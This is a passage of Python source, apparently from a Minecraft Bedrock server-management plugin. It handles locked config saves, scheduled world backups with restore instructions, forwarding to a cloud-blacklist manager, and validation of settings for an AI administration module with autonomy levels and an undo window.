            ai["api_key"] = "__SET__" if k else ""
            ai["has_key"] = bool(k)
        return public

    # ---------------------------------------------------------------- 工具配置写锁
    # config.json / tools_config.json 都是「读-改-写」。
    # 面板是 ThreadingHTTPServer，多个请求会并发进来；没有这把锁时，
    # 两个同时保存的请求各自读到旧快照、各自写回，后写的会把先写的整段覆盖掉
    # （表现为「刚保存的东西一刷新就没了」）。所有写入口都必须走这把锁。
    _CONFIG_WRITE_LOCK = threading.RLock()

    def _save_tools_config(self, payload: Dict[str, Any], sections: Optional[set] = None):
        """保存工具配置。

        ``sections`` 非空时只允许写这里列出的板块，其余一律忽略。
        路由层按 URL 的 scope 传入白名单，避免「只勾了 gametools（绑定/签到）
        板块的临时账号」顺着同一个接口把 ``backup``（备份根目录路径）、
        ``cloud_blacklist``（云黑地址/token）一起改掉 —— 那等于用低权限板块
        拿到了高权限板块的写权限。
        """
        if not isinstance(payload, dict):
            return False, "数据格式不正确"
        # ★ 每加一个新分区都必须同步这里 —— 否则前端「保存成功」但
        #   值根本没写进去（历史上有过 binding/signin/mods 就是这么丢的）。
        _ALL_SECTIONS = ("backup", "cloud_blacklist", "binding", "signin", "mods",
                         "regex_engine", "trust", "ai", "block_record")
        if sections is None:
            allowed = set(_ALL_SECTIONS)
        else:
            allowed = set(sections) & set(_ALL_SECTIONS)
        with self._CONFIG_WRITE_LOCK:
            return self._save_tools_config_locked(payload, allowed)

    def _save_tools_config_locked(self, payload: Dict[str, Any], allowed: set):
        current = self._load_tools_config()
        for section in ("backup", "cloud_blacklist", "binding", "signin", "mods",
                        "regex_engine", "trust", "ai", "block_record"):
            if section not in allowed:
                continue
            p = payload.get(section)
            if not isinstance(p, dict):
                continue
            default_d = DEFAULT_TOOLS_CONFIG.get(section, {})
            d = current.get(section, {})
            for k, v in p.items():
                if k not in d:
                    continue

                if section == "cloud_blacklist" and k == "token" and (v == "" or v == "__SET__"):
                    continue
                # AI 的 api_key 同约定：空串/__SET__ 表示「不改动原值」。
                # 前端拿到的是掩码，原样回传时若不跳过，就会把掩码写成真 key。
                if section == "ai" and k == "api_key" and (v == "" or v == "__SET__"):
                    continue
                if k in default_d and isinstance(default_d[k], bool):
                    v = bool(v)
                d[k] = v
        try:
            if not atomic_write_json(self.data_dir / "tools_config.json", current, indent=2):
                raise RuntimeError("原子写入失败")
        except Exception as e:
            return False, f"保存失败: {e}"

        # 云黑地址或协议偏好可能改了 —— 端点探测缓存必须作废，
        # 否则会拿旧地址的端点继续请求（表现为「改了地址却不生效」）。
        try:
            self._cloud_reset_endpoints()
        except Exception:
            pass
        return True, "已保存" + self._after_tools_config_saved(payload, current)

    def _after_tools_config_saved(self, payload: Dict[str, Any], current: Dict[str, Any]) -> str:
        """备份启停的副作用。返回给前端的附加提示（可空）。"""
        old_en = bool(current.get("backup", {}).get("enabled"))
        new_en = old_en
        _b = payload.get("backup")
        if isinstance(_b, dict) and "enabled" in _b:
            new_en = bool(_b["enabled"])
        try:
            next_run = self._backup_next_run_ts(current.get("backup", {}))
        except Exception:
            next_run = self._backup_state.get("next_run")

        if new_en and not old_en:
            next_run = time.time()
        with self._tools_lock:
            st = self._backup_state
            if new_en and not old_en:
                st["last_finished_ts"] = 0.0
            st["next_run"] = next_run
        if new_en and not old_en:
            return "（自动备份已启用，约 1 分钟内触发首次备份）"
        return ""

    def _save_regex_config(self, cfg: Dict[str, Any]) -> "tuple[bool, str]":
        """保存正则引擎开关（只允许白名单字段，其余忽略）。

        单独开一个入口而不是复用 ``_save_tools_config``：后者是整表覆盖
        语义，而正则规则的保存是**高频**操作 —— 走整表覆盖会让用户在
        另一个页面改的云黑配置被静默回滚。
        """
        if not isinstance(cfg, dict):
            return False, "配置格式不正确"
        current = self._load_tools_config()
        target = current.get("regex_engine")
        if not isinstance(target, dict):
            target = dict(DEFAULT_TOOLS_CONFIG.get("regex_engine", {}))
            current["regex_engine"] = target

        if "enable" in cfg:
            target["enable"] = bool(cfg["enable"])
        if "only_on_main" in cfg:
            target["only_on_main"] = bool(cfg["only_on_main"])
        if "admin_debug" in cfg:
            target["admin_debug"] = bool(cfg["admin_debug"])
        if "command_timeout" in cfg:
            try:
                value = float(cfg["command_timeout"])
            except (TypeError, ValueError):
                return False, "命令超时必须是数字"
            # 主线程上等命令返回，上限必须有 —— 否则一个卡住的命令
            # 会把整个服务器拖死在这里。
            target["command_timeout"] = max(0.1, min(30.0, value))

        # ---- 控制台日志采集开关 ----
        # 这两个键必须在这里放行，否则前端勾了「采集日志」也存不进去：
        # 本方法按**字段白名单**逐项拷贝，没列到的字段会被**静默丢弃**，
        # 表现就是"开关保存后自己弹回去"。这类静默失败最难查。
        if "log_enabled" in cfg:
            target["log_enabled"] = bool(cfg["log_enabled"])
        if "log_start_at_end" in cfg:
            target["log_start_at_end"] = bool(cfg["log_start_at_end"])

        try:
            if not atomic_write_json(self.data_dir / "tools_config.json", current, indent=2):
                raise RuntimeError("原子写入失败")
        except Exception as e:
            return False, f"保存失败: {e}"

        # ★ 立刻让开关生效。
        #   不重启服务器就切换采集，是这里必须做的事 —— 用户改了开关却
        #   看不到任何变化（要重启才生效）会直接判定"这功能是坏的"。
        #   _start_log_tailer 先停后起，重复调用安全。
        try:
            self._start_log_tailer()
        except Exception as e:
            self.logger.warning(f"[日志采集] 重新加载失败: {e}")
        return True, "已保存"

    def _backup_dir(self, cfg: Dict[str, Any] = None) -> Path:

        return self.data_dir / "backups"

    def _backup_sources(self, cfg: Dict[str, Any]) -> List[str]:
        srcs: List[str] = []
        raw = cfg.get("source_paths")
        if isinstance(raw, list):
            srcs = [str(x).strip() for x in raw if str(x).strip()]
        elif isinstance(raw, str) and raw.strip():
            srcs = [ln.strip() for ln in raw.splitlines() if ln.strip()]
        if not srcs:

            srcs = self._locate_current_world()
        return srcs

    def _locate_current_world(self) -> List[str]:

        try:
            root = self._find_server_root() or Path.cwd()
        except Exception:
            root = Path.cwd()

        level_name = None
        try:
            level_name = getattr(self.server.level, "name", None)
        except Exception:
            level_name = None
        world_list = []
        lvl_from_props = None
        try:
            world_list, lvl_from_props, _ = self._list_worlds()
        except Exception:
            world_list = []
        if not level_name:
            level_name = lvl_from_props or None

        if level_name:
            for cand in (root / "worlds" / str(level_name), root / str(level_name)):
                if cand.is_dir():
                    self.logger.info(f"[备份] 世界定位: root={root} level_name={level_name} 命中目录={cand}")
                    return [str(cand)]

        def _lv_mtime(w):
            try:
                p = Path(w["path"]) / "level.dat"
                return p.stat().st_mtime if p.exists() else 0
            except Exception:
                return 0
        ordered = sorted(world_list, key=_lv_mtime, reverse=True)
        pick = None
        if level_name:
            ln = str(level_name).lower()
            for w in ordered:
                if str(w["name"]).lower() == ln:
                    pick = w
                    break
        if pick is None and ordered:
            pick = ordered[0]
        if pick is not None:
            self.logger.info(f"[备份] 世界定位: root={root} level_name={level_name} 候选={[w['name'] for w in ordered]} 选中={pick['path']}")
            return [pick["path"]]

        for base in (root / "worlds", root):
            try:
                if not base.is_dir():
                    continue
                dirs = [d for d in base.iterdir()
                        if d.is_dir() and not d.name.startswith(".")
                        and (d / "level.dat").exists()]
                if dirs:

                    dirs.sort(key=lambda d: (Path(d) / "level.dat").stat().st_mtime, reverse=True)
                    self.logger.info(f"[备份] 世界定位(兜底): root={root} 世界={[d.name for d in dirs]} 选中={dirs[0]}")
                    return [str(dirs[0])]
            except Exception:
                continue
        return []

    @staticmethod
    def _path_under(path, parent) -> bool:
        try:
            a = os.path.abspath(path)
            b = os.path.abspath(parent)
            if a == b:
                return True
            return os.path.commonpath([a, b]) == b if b else False
        except Exception:
            return False

    def _backup_worker(self):
        try:
            cfg = self._load_tools_config().get("backup", {})
            bdir = self._backup_dir(cfg)
            bdir.mkdir(parents=True, exist_ok=True)
            srcs = self._backup_sources(cfg)
            if not srcs:
                raise RuntimeError("备份源为空（source_paths 为空且无法定位世界目录）")
            self.logger.info(f"[备份] 本次备份源: {srcs}")
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"backup_{stamp}.zip"
            fpath = bdir / fname
            count = 0

            with zipfile.ZipFile(str(fpath), "w", zipfile.ZIP_STORED, allowZip64=True) as zf:
                for src in srcs:
                    sp = Path(src)
                    if not sp.exists():
                        continue
                    if sp.is_file():
                        zf.write(str(sp), os.path.join(sp.name, sp.name))
                        count += 1
                        continue
                    for base, dirs, files in os.walk(str(sp)):

                        if self._path_under(base, str(bdir)):
                            dirs[:] = []
                            continue
                        dirs[:] = [d for d in dirs if d != "__pycache__"]
                        for fn in files:
                            full = os.path.join(base, fn)
                            arc = os.path.join(sp.name, os.path.relpath(full, str(sp)))
                            try:
                                zf.write(full, arc)
                                count += 1
                            except Exception:
                                continue
            if count == 0:
                fpath.unlink(missing_ok=True)
                raise RuntimeError("备份目录中没有可打包的文件")
            self._prune_backups(bdir, int(cfg.get("max_keep", 10)) or 10)
            size = fpath.stat().st_size
            src_label = ";".join(str(Path(s).name).strip() for s in srcs[:3])
            msg = f"备份完成：{fname}（源：{src_label or '?'}，{count} 个文件，{_fmt_size(size)}）"
            self._set_backup_state(True, msg, fname)
        except Exception as e:
            msg = f"备份失败：{e}"
            self.logger.error(f"[备份] {msg}")
            self._set_backup_state(False, msg, None)

    def _set_backup_state(self, ok: bool, message: str, fname):
        try:
            cfg = self._load_tools_config().get("backup", {})

            next_run = self._backup_next_run_ts(cfg)
            with self._backup_lock:
                st = self._backup_state
                st["running"] = False
                st["started_ts"] = 0.0
                st["last_result"] = [bool(ok), str(message), fname, time.time()]
                st["last_finished_ts"] = time.time()
                st["next_run"] = next_run
        except Exception as e:
            self.logger.error(f"[备份] 更新备份状态失败: {e}")

    def _backup_next_run_ts(self, cfg: Dict[str, Any]) -> float:
        hours = max(0.25, float(cfg.get("interval_hours", 24) or 24))
        span = hours * 3600.0
        with self._backup_lock:
            last = self._backup_state.get("last_finished_ts") or 0.0
        base = last if last else time.time()
        return base + span

    def _backup_tick(self):
        if self._periodic_stopped:
            return

        try:
            with self._backup_lock:
                st = self._backup_state
                if st.get("running"):

                    st0 = st.get("started_ts") or 0.0
                    if 0 < st0 < time.time() - 1800:
                        self.logger.warning("[备份] 检测到备份任务长时间未完成，看门狗自动复位")
                        st["running"] = False
                        st["last_result"] = [False, "备份超时已复位", None, time.time()]
                    else:
                        return
                if not st.get("next_run"):
                    st["next_run"] = time.time() + 3600
            cfg = self._load_tools_config().get("backup", {})
            if not cfg.get("enabled"):
                return
            with self._backup_lock:
                due = time.time() >= (self._backup_state.get("next_run") or 0)
            if due:
                self._trigger_backup()
        except Exception:
            pass

    def _trigger_backup(self) -> bool:
        with self._backup_lock:
            if self._backup_state.get("running"):
                return False
            self._backup_state["running"] = True
            self._backup_state["last_result"] = None
            self._backup_state["started_ts"] = time.time()
        try:
            self._executor.submit(self._backup_worker)
            self.logger.info("[备份] 已在后台启动备份任务")
            return True
        except Exception as e:
            self.logger.error(f"[备份] 无法提交备份任务: {e}")
            with self._backup_lock:
                self._backup_state["running"] = False
            return False

    def _get_backup_state(self) -> Dict[str, Any]:
        try:
            with self._backup_lock:
                return {
                    "running": self._backup_state.get("running"),
                    "last_result": self._backup_state.get("last_result"),
                    "last_finished_ts": self._backup_state.get("last_finished_ts"),
                    "next_run": self._backup_state.get("next_run"),
                }
        except Exception:
            return {}

    def _list_backups(self) -> List[Dict[str, Any]]:
        cfg = self._load_tools_config().get("backup", {})
        bdir = self._backup_dir(cfg)
        items: List[Dict[str, Any]] = []
        if bdir.exists():
            for p in sorted(bdir.glob("backup_*.zip"), key=lambda x: x.stat().st_mtime, reverse=True):
                try:
                    st = p.stat()
                    items.append({
                        "name": p.name,
                        "size": st.st_size,
                        "mtime": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                    })
                except Exception:
                    continue
        return items

    def _delete_backup(self, name: str):
        name = str(name or "").strip()
        if not name.endswith(".zip") or not name.startswith("backup_"):
            return False, "非法文件名"
        cfg = self._load_tools_config().get("backup", {})
        bdir = self._backup_dir(cfg)
        target = (bdir / name).resolve()
        if not target.is_file() or not self._path_under(str(target), str(bdir)):
            return False, "文件不存在或路径越界"
        try:
            target.unlink()
            return True, f"已删除 {name}"
        except Exception as e:
            return False, f"删除失败: {e}"

    def _prune_backups(self, bdir: Path, max_keep: int):
        if max_keep <= 0:
            return
        try:
            files = sorted(bdir.glob("backup_*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
            for f in files[max_keep:]:
                try:
                    f.unlink()
                except Exception:
                    pass
        except Exception:
            pass

    def _restore_backup(self, name: str):
                                                                                                                   
                                                                                                             
        name = str(name or "").strip()
        if not name.endswith(".zip") or not name.startswith("backup_"):
            return False, "非法备份文件名"
        try:
            bdir = self._backup_dir()
            src = (bdir / name).resolve()
            if not src.is_file() or not self._path_under(str(src), str(bdir)):
                return False, "备份文件不存在或路径越界"
            root = self._find_server_root() or Path.cwd()
            dest = root / name
            shutil.copy2(str(src), str(dest))

            _, content = self._read_properties_raw()
            current = self._get_property_value(content, "level-name") or "当前世界"
            msg = (f"✅ 备份已复制到服务器根目录：{dest}\n"
                   "请手动切换（不会在运行时换档，最大化避免崩溃）：\n"
                   "1. 停止服务器；\n"
                   "2. 打开上方的服务器根目录；\n"
                   f"3. 把当前世界目录 {current} 改名为 {current}_old 备份；\n"
                   f"4. 用解压工具把该 zip 解压到根目录（zip 内含的世界文件夹会自动放置）；\n"
                   "5. 重启服务器即生效。")
            self.logger.info(f"[备份] 已复制 {name} 到 {dest}，当前世界={current}")
            return True, msg
        except Exception as e:
            return False, f"复制失败: {e}"

    # ------------------------------------------------------------ 云黑（实现已抽到 cloud.py）
    #
    # ★ 为什么保留这些薄转发方法，而不是把调用点全改掉
    # ------------------------------------------------------
    # 实现已整体迁到 ``cloud.py`` 的 ``CloudManager``（442 行 → 那里的
    # 自包含模块）。但**方法名保持原样**：``web.py`` 与若干内部调用点仍按
    # ``self._cloud_xxx(...)`` 调过来。改名会波及一大片调用点，收益却只是
    # 「名字好看点」；保留转发则**外部行为零变化**。
    # ``test_cloud_api.py``（77 条）是本次重构的安全网。

    @property
    def cloud_mgr(self):
        """惰性获取云黑管理器实例。

        ⚠ 为什么用惰性属性，而不是在 ``on_enable`` 里赋值 ——
          ``_cloud_cfg()`` 可能在插件完全装配**之前**就被调用（例如 web 端
          在 enable 过程中回显配置）。那种时刻属性还不存在，直接取会
          AttributeError。惰性创建保证「任何时刻调用都拿得到实例」。
        """
        mgr = getattr(self, "_cloud_mgr_inst", None)
        if mgr is None:
            mgr = CloudManager(self)
            self._cloud_mgr_inst = mgr
        return mgr

    @property
    def _CLOUD_ENDPOINTS(self):
        """端点候选表（只读别名，保证 web 端展示口径与 cloud.py 一致）。"""
        return CloudManager._CLOUD_ENDPOINTS

    @property
    def CLOUD_EDITION(self):
        """本插件面向 BDS（基岩版），云黑一律落 bedrock 分组。"""
        return CloudManager.CLOUD_EDITION

    def _cloud_cfg(self):
        return self.cloud_mgr._cfg()

    def _cloud_b64(self, payload):
        return CloudManager._b64(payload)

    def _cloud_base(self):
        return self.cloud_mgr._base()

    def _cloud_url_candidates(self, kind):
        return self.cloud_mgr._url_candidates(kind)

    def _cloud_style(self):
        return self.cloud_mgr._style()

    def _cloud_path_of(self, url):
        return CloudManager._path_of(url)

    def _cloud_endpoint(self, kind):
        return self.cloud_mgr._endpoint(kind)

    def _cloud_probe(self, url):
        return self.cloud_mgr._probe(url)

    def _cloud_reset_endpoints(self):
        return self.cloud_mgr._reset_endpoints()

    def _cloud_request(self, kind, payload=None, method="GET", timeout=None,
                       token=None, require_token=False, url=None):
        return self.cloud_mgr._request(
            kind, payload=payload, method=method, timeout=timeout,
            token=token, require_token=require_token, url=url)

    def _cloud_fill_edition(self, p, edition=None):
        return self.cloud_mgr._fill_edition(p, edition)

    def _cloud_sync(self, payload):
        return self.cloud_mgr._sync(payload)

    def _cloud_sync_worker(self, payload):
        return self.cloud_mgr._sync_worker(payload)

    def _cloud_unban_worker(self, payload):
        return self.cloud_mgr._unban_worker(payload)

    def _cloud_sync_unban(self, payload):
        return self.cloud_mgr._sync_unban(payload)

    def _cloud_check_login(self, name, xuid, ip):
        return self.cloud_mgr._check_login(name, xuid, ip)

    def _cloud_test(self):
        return self.cloud_mgr._test()

    def _cloud_api_style_name(self):
        return self.cloud_mgr._api_style_name()

    def _cloud_list_bans(self, edition=None):
        return self.cloud_mgr._list_bans(edition)

    def _cloud_stats(self):
        return self.cloud_mgr._stats()

    def _cloud_lookup(self, data):
        return self.cloud_mgr._lookup(data)

    def _maybe_cloud_check(self, player):
        """进服查黑。**留在 core.py** —— 它不是云黑 HTTP 逻辑。

        这个方法只做"从玩家对象上取标识（xuid / IP）"，取到之后才把活
        交给执行器里的 ``_cloud_check_login``。取 IP 要走 ``server.get_player``
        与 ``SocketAddress``，那是插件宿主的职责，不是云黑客户端的职责；
        ``cloud.CloudManager.maybe_check()`` 因此设计成**接收已解析好的
        标识**，两边分工不重叠。

        踩过的坑：Phase 1 抽取时这个方法夹在 `_cloud_*` 方法中间，
        被整段扫进了 cloud.py，导致 core.py 里 ``hostname`` 读取彻底消失
        （``test_trust_web.py`` 的反向锚点因此失败）。这里补回来。
        """
        cfg = self._cloud_cfg()
        if not cfg.get("enabled") or not cfg.get("check_on_login", True):
            return
        try:
            name = player.name
            xuid = getattr(player, "xuid", None)
            ip = ""
            try:
                addr = getattr(player, "address", None)
                # SocketAddress 的属性名是 hostname（不是 host）。
                ip = getattr(addr, "hostname", "") or ""
            except Exception:
                pass
        except Exception:
            return
        xuid = str(xuid) if xuid else None
        ip = ip or None
        if not (xuid or ip):
            return
        try:
            self._executor.submit(self._cloud_check_login, name, xuid, ip)
        except Exception as e:
            self.logger.warning(f"[云黑] 提交进服检查失败: {e}")

    def _resolve_player_ident(self, name: str, _player=None):
        """按玩家名解析出 (xuid, ip)，查不到就给 None。

        ``_player`` 是可选快路径：已经拿到 Player 对象的调用方直接传进来，
        省掉一次 ``server.get_player``。带下划线是因为它是**内部优化参数**，
        不是对外契约（``web.py`` 只传 name）。

        **留在 core.py** —— 依赖 ``server.get_player`` 与
        ``SocketAddress.hostname``，属于宿主能力而非云黑客户端能力。
        封禁上报（``_cloud_sync_worker``）需要这两个标识，但它是在云端
        交互层调用的，所以只把"解析结果"传下去。

        同样是被 Phase 1 误扫进 cloud.py 的方法之一，此处复原。
        """
        try:
            p = _player
            if p is None:
                p = self.server.get_player(str(name))
            if p is not None:
                xuid = getattr(p, "xuid", None)
                ip = ""
                try:
                    addr = getattr(p, "address", None)
                    # SocketAddress 的属性名是 hostname（不是 host）。
                    # 用 host 会永远拿到 ""，云黑上报的 IP 一直是空值。
                    ip = getattr(addr, "hostname", "") or ""
                except Exception:
                    pass
                return (str(xuid) if xuid else None), (ip or None)
        except Exception:
            pass
        return None, None

    def _cloud_cfg_raw(self):
        return self.cloud_mgr._cfg_raw()

    # ---------------------------------------------------------------- AI 自动管理
    # 编排层在 ``ai/manager.py``，执行层在 ``ai/runner.py``，闸门在 ``ai/gate.py``。
    # 和 cloud_mgr 同样的思路：core 只留一个**惰性入口 + 转发**，
    # 逻辑全在自包含模块里，这样 AI 模块能脱离 Endstone 单独测试。
    #
    # ★ 为什么必须惰性：web 端可能在插件装配完成前就来读 AI 状态
    #   （面板初始化时会并发拉取各板块），那一刻实例还不存在。
    #   惰性属性保证「任何时刻调用都拿得到实例」，和 cloud_mgr 同理。

    @property
    def ai_manager(self):
        mgr = getattr(self, "_ai_mgr_inst", None)
        if mgr is None:
            from .ai import AIManager
            mgr = AIManager(self)
            self._ai_mgr_inst = mgr
        return mgr

    def _ai_status(self):
        return self.ai_manager.status()

    def _ai_config_public(self) -> Dict[str, Any]:
        """给前端的 AI 配置（不回传 api_key 明文）。

        ★ 与云黑 token 用同一约定：不回显明文，只回 ``__SET__``。
          云黑那里是 ``_tools_public_config`` 顺手做的掩码；AI 这里是
          独立入口，因为面板要单独拉这一块，不能靠整包掩码。
        """
        cfg = json.loads(json.dumps(DEFAULT_TOOLS_CONFIG.get("ai", {})))
        cur = self._load_tools_config().get("ai", {})
        if isinstance(cur, dict):
            for k, v in cur.items():
                if k in cfg:
                    cfg[k] = v
        key = str(cfg.get("api_key", ""))
        cfg["api_key"] = "__SET__" if key else ""
        cfg["has_key"] = bool(key)
        return cfg

    def _save_ai_config(self, payload: Dict[str, Any]):
        """保存 AI 配置。**逐字段白名单**，不接受任何未声明的键。

        为什么不像 ``_save_tools_config_locked`` 那样"逐键判断"就够了：
        那个函数是给多个分区共用的，每个分区都有一堆字段；AI 这块的
        安全敏感度高（它决定了请求发去哪、能开哪些能力、影子模式是否关），
        所以这里显式列出允许的字段与类型，多一个键都写不进去。
        """
        if not isinstance(payload, dict):
            return False, "数据格式不正确"

        cur_all = self._load_tools_config()
        sec = cur_all.get("ai", {})
        if not isinstance(sec, dict):
            sec = json.loads(json.dumps(DEFAULT_TOOLS_CONFIG.get("ai", {})))
        # 用默认分区兜底，避免老配置文件缺字段时 KeyError
        base = json.loads(json.dumps(DEFAULT_TOOLS_CONFIG.get("ai", {})))
        for k, v in sec.items():
            if k in base:
                base[k] = v
        sec = base

        # ---- 布尔字段 ----
        for k in ("enabled", "enable_log_analysis", "enable_whitelist_review",
                  "enable_auto_manage", "shadow_mode",
                  "chat_enabled", "chat_allow_read_tools"):
            if k in payload:
                sec[k] = bool(payload.get(k))

        # ---- 接管级别（v7.9 主控）----
        # ★ 单独处理而不是混进"数值字段"那一堆：它的合法值只有 0/1/2，
        #   而且**不接受静默回落** —— 用户以为切到了第二级、实际因为
        #   填了个 5 而回落到默认，这种"设置看起来生效了"比直接报错危险。
        if "autonomy_level" in payload:
            try:
                lv = int(payload.get("autonomy_level"))
            except (TypeError, ValueError):
                return False, "接管级别必须是 0 / 1 / 2"
            if lv not in (0, 1, 2):
                return False, "接管级别必须是 0（纯建议）/ 1（白名单自动）/ 2（完全放开）"
            sec["autonomy_level"] = lv
            # 迁移完成后把旧字段对齐，避免降级回旧版本时行为突变：
            # 级别 0 存 True（旧语义"保守"），其余存 False。
            sec["shadow_mode"] = (lv == 0)

        # ---- 字符串字段 ----
        for k in ("base_url", "model"):
            if k in payload:
                sec[k] = str(payload.get(k) or "").strip()
        if "api_key" in payload:
            v = str(payload.get("api_key") or "")
            # __SET__ / 空串 表示"不改动原值"——前端拿到的本来就是掩码，
            # 原样回传时绝不能把掩码当成真 key 写进去（那会让配置失效）。
            if v not in ("", "__SET__"):
                sec["api_key"] = v

        # ---- 文本字段（提示词）----
        # ★ 两种语义要区分开：
        #   · 键**不在** payload 里 → 不动（前端只改了别的设置）
        #   · 键在 payload 里且是空串 → **清空**（这就是"一键恢复默认"）
        #   如果混为一谈，"恢复默认"永远不会生效 —— 那是个查很久的 bug。
        for k in ("ai_system_prompt_custom", "chat_system_prompt_custom"):
            if k in payload:
                v = payload.get(k)
                if v is None:
                    v = ""
                if not isinstance(v, str):
                    return False, f"{k} 必须是文本"
                if len(v) > 32768:
                    return False, f"{k} 过长（上限 32768 字符）"
                sec[k] = v

        # ---- 数值字段（带范围校验，避免填出负值/超大值）----
        if "timeout" in payload:
            try:
                t = float(payload.get("timeout"))
            except (TypeError, ValueError):
                return False, "timeout 必须是数字"
            if not 5.0 <= t <= 180.0:
                return False, "timeout 必须在 5 到 180 秒之间"
            sec["timeout"] = t
        if "max_log_lines" in payload:
            try:
                n = int(payload.get("max_log_lines"))
            except (TypeError, ValueError):
                return False, "max_log_lines 必须是整数"
            sec["max_log_lines"] = max(10, min(n, 500))
        if "min_interval" in payload:
            try:
                n = int(payload.get("min_interval"))
            except (TypeError, ValueError):
                return False, "min_interval 必须是整数"
            sec["min_interval"] = max(0, min(n, 86400))
        if "daily_limit" in payload:
            try:
                n = int(payload.get("daily_limit"))
            except (TypeError, ValueError):
                return False, "daily_limit 必须是整数"
            sec["daily_limit"] = max(0, min(n, 100000))

        # ---- 撤销窗口 ----
        if "undo_window_seconds" in payload:
            try:
                n = int(payload.get("undo_window_seconds"))
            except (TypeError, ValueError):
                return False, "撤销窗口必须是整数（秒）"
            # 0 ~ 600 秒。上限 10 分钟：再长就不是"后悔药"而是"延迟执行"，
            # 服主会忘了自己还挂着一条待回滚记录。
            sec["undo_window_seconds"] = max(0, min(n, 600))

        # ---- 聊天参数（@AI）----
        for key, lo, hi in (("chat_max_tokens", 1, 4096),
                            ("chat_min_interval", 0, 3600),
                            ("chat_daily_limit", 0, 100000),
                            ("chat_max_chars", 20, 4000)):
            if key not in payload:
                continue
            try:
                n = int(payload.get(key))
            except (TypeError, ValueError):
                return False, f"{key} 必须是整数"
            sec[key] = max(lo, min(n, hi))
        if "chat_temperature" in payload:
            try:
                t = float(payload.get("chat_temperature"))
            except (TypeError, ValueError):
                return False, "chat_temperature 必须是数字"
            sec["chat_temperature"] = max(0.0, min(t, 2.0))

        # ---- 群友聊天上下文 ----
        # ★ chat_context_turns 上限 50 轮：再往上输入长度会远超输出，
        #   既贵又容易触到模型自己的上下文窗口，属于"配了也不会更好用"。
        #   下限就是 0（关闭）。
        for key, lo, hi in (("chat_context_turns", 0, 50),
                            ("chat_context_max_chars", 20, 2000)):
            if key not in payload:
                continue
            try:
                n = int(payload.get(key))
            except (TypeError, ValueError):
                return False, f"{key} 必须是整数"
            sec[key] = max(lo, min(n, hi))

        # ---- 玩家行为记录 ----
        # ★ 这几个键已经搬到 ``behavior_record`` 段（它不属于 AI）。
        #   新页面走 /api/region/settings 保存；这里保留一份是为了兼容
        #   还开着旧页面的浏览器（老页面会把它们发到 /api/ai/save）。
        #   两条入口写的是**同一个新位置**，不会出现"各写一处"的分裂。
        br = cur_all.get("behavior_record")
        if not isinstance(br, dict):
            br = json.loads(json.dumps(
                DEFAULT_TOOLS_CONFIG.get("behavior_record", {})))
        if "behavior_record_level" in payload:
            try:
                n = int(payload.get("behavior_record_level"))
            except (TypeError, ValueError):
                return False, "行为记录档位必须是整数（0~3）"
            # 夹到 0~3。这里**不能**用"越界就报错"的做法：
            # 前端下拉框只有 4 个值，越界只会来自异常请求，
            # 夹取比抛错更能保证配置始终处于可用状态。
            br["level"] = max(0, min(n, 3))
        # ★ keep_days / max_records 的下限都是 **1**，不是更大的数。
        #   behaviors.py 的 prune() 只把 0/负数挡掉，这里必须一致 ——
        #   否则会出现"面板允许配 1、后端却静默改成 100"的漂移。
        for key, lo, hi, new_key in (("behavior_keep_days", 1, 365, "keep_days"),
                                     ("behavior_max_records", 1, 5000000, "max_records"),
                                     ("behavior_query_limit", 1, 500, "query_limit")):
            if key not in payload:
                continue
            try:
                n = int(payload.get(key))
            except (TypeError, ValueError):
                return False, f"{key} 必须是整数"
            br[new_key] = max(lo, min(n, hi))

        # ---- 工具权限（列表）----
        # ★ 必须**规范化后再存**，不能原样落盘：
        #   · 未知工具名要丢掉（版本升级后旧名字会失效，留着会让
        #     用户以为勾了、实际不生效）；
        #   · 去重、去空白，避免前端重复渲染；
        #   · 声明为 list，防止前端传个字符串/对象进来。
        # 规范化用的是 tools.normalize_tool_names，与运行时判定同源，
        # 保证"存进去什么"和"运行时认什么"永远一致。
        if "allowed_tools" in payload:
            raw = payload.get("allowed_tools")
            if raw is None:
                raw = []
            if not isinstance(raw, (list, tuple)):
                return False, "allowed_tools 必须是列表"
            sec["allowed_tools"] = _ai_normalize_tools(raw)

        # 保存前过一遍闸门（主要是 SSRF）；只在校验**合并后**的配置，
        # 因为用户可能本次只改了一个开关、地址是上次存的。
        ok, why = self.ai_manager.validate_for_save(sec)
        if not ok:
            return False, why

        with self._CONFIG_WRITE_LOCK:
            cur_all = self._load_tools_config()
            if not isinstance(cur_all.get("ai"), dict):
                cur_all["ai"] = {}
            cur_all["ai"].update(sec)
            # 玩家行为记录已经搬到独立段；br 非空说明本次请求带了它的字段
            if br:
                cur_all["behavior_record"] = br
            try:
                if not atomic_write_json(self.data_dir / "tools_config.json",
                                         cur_all, indent=2):
                    raise RuntimeError("原子写入失败")
            except Exception as e:
                return False, f"保存失败: {e}"
        return True, "已保存"

    def _ai_test_connection(self):
        """测试连接。**不消耗每日额度**（否则点几次测试就把额度用掉了）。"""
        return self.ai_manager.test_connection()

    def _ai_run(self, task: str, *, manual: bool = True, extra: str = ""):
        task = str(task or "").strip()
        if task == "log_analysis":
            return self.ai_manager.analyze_logs(manual=manual, extra=extra)
        if task == "whitelist_review":
            return self.ai_manager.review_whitelist(manual=manual)
        if task == "auto_manage":
            return self.ai_manager.auto_manage(manual=manual)
        return {"ok": False, "error": f"未知的分析类型：{task}"}

    def _ai_last_result(self):
        return self.ai_manager._result_brief()

    def _ai_broadcast_last(self):
        """把最近一次分析结论推给「AI 播报」用途的机器人。"""
        return self.ai_manager.broadcast_last()

    def _ai_proposals(self, *, include_done: bool = False, limit: int = 50):
        return self.ai_manager.runner.list_proposals(
            include_done=include_done, limit=limit)

    def _ai_confirm_proposal(self, pid: str, *, actor: str = "admin"):
        return self.ai_manager.runner.confirm_proposal(str(pid or ""), actor=actor)

    def _ai_reject_proposal(self, pid: str, *, actor: str = "admin"):
        return self.ai_manager.runner.reject_proposal(str(pid or ""), actor=actor)

    # ---------------------------------------------------------- 撤销窗口
    def _ai_undo_list(self, *, include_done: bool = False, limit: int = 50):
        """撤销窗口里的记录（接管级别 2 的后悔药）。"""
        return self.ai_manager.list_undoable(include_done=include_done,
                                             limit=limit)

    def _ai_undo(self, rid: str, *, actor: str = "admin"):
        """回滚一条已执行的不可逆操作。

        ★ 返回值的第一项是"是否成功" —— 前端必须区分"回滚成功"和
          "回滚失败（备份不在了）"。把失败当成功报会救不回来的东西。
        """
        ok, msg = self.ai_manager.undo(str(rid or ""), actor=actor)
